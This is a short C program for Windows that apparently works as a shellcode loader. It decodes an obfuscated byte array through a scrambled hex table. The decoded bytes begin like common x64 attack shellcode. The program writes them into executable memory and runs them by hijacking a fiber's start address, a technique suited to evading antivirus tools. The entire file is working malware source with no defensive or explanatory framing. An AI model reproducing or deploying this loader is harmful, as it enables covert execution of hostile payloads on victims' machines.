#include <Windows.h>
#include <stdio.h>
//#define DEBUG
#ifdef DEBUG
#define TRACE() debugPrint(__FILE__,__LINE__)
#else
#define TRACE() 
#endif
void debugPrint(CONST CHAR* path, INT line) {
#ifdef DEBUG
	printf("file:%s line:%d error:%d\n", path, line, GetLastError());
#endif // DEBUG
}


unsigned int buf[] = {
 9,10,11, 0, 0, 4,13,11, 9,15,13, 0,10,15,15,15,
15,15,15,15,11, 3, 6, 3,11, 3, 6,15, 6, 5, 6, 3,
 6, 7,11, 0, 4, 3,14, 5, 7, 6,11, 0, 0, 8, 6, 5,
 7,15,11, 0, 0, 8, 6, 5, 3, 0,11, 0, 0, 8, 6, 5,
 5,15,11, 0, 0, 8, 1, 5, 6,15,11, 0,15, 9, 8, 1,
11, 2,11, 2,11,14, 4, 3,10,12,11, 0, 4, 3,10,15,
 2,10, 4,10, 7, 3, 1,10,15, 5, 5,10, 5,15,11, 3,
10, 3,10,12,15,14,11, 3,15, 3,10, 3,13, 5,13,14,
 6, 5,11, 3, 6, 3,11, 0, 0, 8, 6, 5, 5,15, 0, 8,
11, 5, 4,10,11, 0,15, 3,14,15, 0, 8, 0,15, 0, 0,
15,15,15,15,15,15,11, 0, 0, 6,10,15, 1,11, 7, 1,
11, 0,15, 3,14,15, 6,15, 0, 8,11, 0, 3, 0,11,11,
 0, 8,11,15, 5,15,11,12,15, 3,14,15,13, 4, 6, 7,
11, 0, 9, 9,10,12,11, 3, 0, 8, 4,11, 0, 0,11, 0,
15, 3,14, 7,11,14, 4, 3,10,12,11, 0, 4, 3,10,15,
 2,10,11, 3,10, 3,10,12,15,14,11, 3,15, 3,10, 3,
 4, 0,13,15, 1, 6, 9, 3,11,10,15, 4,11,10, 5,11,
15, 0,11, 6, 4,12,14, 3, 1, 6,14, 0, 6, 0,11,11,
 0, 8,11,15, 5,11,11,12,15, 3,14,15, 7, 7,11, 3,
 0, 8,15,10,11, 0,11,11, 0, 8,11,15, 3,10,11,12,
15, 3,14,15,11, 3, 0, 8,15,11, 0, 0,11, 0,15, 3,
14,15,11, 3, 6, 0,11, 3, 6, 0, 6,13, 6,12, 6, 2,
11, 3, 6, 0,11, 3, 6,12,11, 3, 6, 2,11, 0, 0, 4,
13,10, 5,15,11, 3, 6, 5, 9, 9,13,15, 6, 0,11, 3,
 6,12, 6, 2,11, 0, 0, 8, 3, 5,13,12, 6, 1, 9, 9,
 9, 9, 9, 9, 6,14,11, 0, 8, 2,15, 3,15,15,15,15,
15,15,15,15,15,15,15,15,15,15,11, 0, 0,14, 0,14,
15, 3,15, 3,15,15,15,15,11, 3, 8, 2, 4, 3, 0, 8,
 7, 9, 0, 1, 9, 9,14, 6, 8, 8, 9,15, 8, 6, 2, 5,
 6, 7,11, 3, 8, 2, 2, 7,12, 6, 8,14,12,14, 9, 9,
14, 6,11, 0, 0, 4,10,11, 5, 0, 4,10,15, 7, 1,10,
15, 2, 0,15, 9, 8,13,15, 1, 6,15, 6, 8, 8,11, 1,
 3, 4, 1, 5, 7, 9, 7, 2,15,15, 6,12,11, 3, 0,12,
14, 2, 9, 9,14, 6, 7, 4, 7, 3, 7,10, 7, 4, 5,13,
 7, 6, 1, 0, 7, 6,15,15,15,15 };

char table[] = "87a13256bfc49ed0";

char itoh(int i) {
	char c = table[i];

	if (c < 0x60) {
		c = c - 0x30;
	}
	else {
		c = c + 0x0a - 0x61;
	}
	return c;
}


void code(void *buf,unsigned int* off, int offlen) {
	int len = offlen / 2;
	char tmp = 0x00;
	for (int i = 0, j = 0; i < len && j < offlen; i++, j = 2 * i) {
		tmp = ((itoh(off[j]) << 4) & 0xf0) | (itoh(off[j + 1]) & 0x0f);
		((char*)buf)[i] = tmp;
	}
}


int main() {

	ConvertThreadToFiber(NULL);

	LPVOID lpFiber = CreateFiber(0x100, (LPFIBER_START_ROUTINE)debugPrint, NULL);
	LPVOID addr = VirtualAlloc(NULL, sizeof(buf)/4, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	code(addr,buf, sizeof(buf)/4);

	if (lpFiber == NULL) {
		TRACE();
		exit(0);
	}

	uintptr_t* tgtFuncAddr = (uintptr_t*)((uintptr_t)lpFiber + 0xB0);
	*tgtFuncAddr = (uintptr_t)addr;

	SwitchToFiber(lpFiber);
}